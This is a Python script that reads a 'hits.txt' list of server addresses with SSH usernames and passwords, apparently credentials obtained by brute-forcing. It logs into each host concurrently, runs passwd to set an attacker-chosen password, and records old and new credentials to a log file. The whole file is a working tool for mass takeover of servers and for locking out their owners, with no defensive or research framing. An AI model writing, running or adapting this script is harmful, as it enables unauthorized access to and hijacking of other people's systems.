import asyncio
import paramiko
import os
from datetime import datetime

TARGETS_FILE = "hits.txt"
LOG_FILE = "changed_passwords.txt"
TIMEOUT = 10

async def change_password(ip, port, username, password, new_password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        await asyncio.to_thread(client.connect, ip, int(port), username, password, timeout=TIMEOUT)

        shell = await asyncio.to_thread(client.invoke_shell)
        await asyncio.sleep(1)

        shell.send("passwd\n")
        await asyncio.sleep(1)
        shell.send(f"{new_password}\n")
        await asyncio.sleep(1)
        shell.send(f"{new_password}\n")
        await asyncio.sleep(2)

        output = shell.recv(2048).decode(errors="ignore")
        if "success" in output.lower() or "changed" in output.lower():
            print(f"[+] Changed password on {ip} ({username})")
            await save_success(ip, port, username, password, new_password)
        else:
            print(f"[!] Attempted but unsure: {ip} ({username})")
        client.close()
    except Exception as e:
        print(f"[-] Failed {ip} ({username}) -> {e}")

async def save_success(ip, port, user, old_pw, new_pw):
    line = f"[{datetime.utcnow().isoformat()}] {ip}:{port} {user}:{old_pw} -> {new_pw}\n"
    async with asyncio.Lock():
        with open(LOG_FILE, "a") as f:
            f.write(line)

async def main(new_password):
    tasks = []
    if not os.path.exists(TARGETS_FILE):
        print("targets.txt not found.")
        return

    with open(TARGETS_FILE, "r") as f:
        for line in f:
            if not line.strip():
                continue
            parts = line.strip().split()
            if len(parts) != 2:
                continue
            ip_port, creds = parts
            if ":" not in ip_port or ":" not in creds:
                continue
            ip, port = ip_port.split(":")
            user, pw = creds.split(":")
            tasks.append(change_password(ip, port, user, pw, new_password))

    await asyncio.gather(*tasks)

def run():
    import nest_asyncio
    nest_asyncio.apply()
    new_pw = input("[?] New password to set: ").strip()
    if not new_pw:
        print("[-] No password entered.")
        return
    asyncio.run(main(new_pw))

if __name__ == "__main__":
    run()
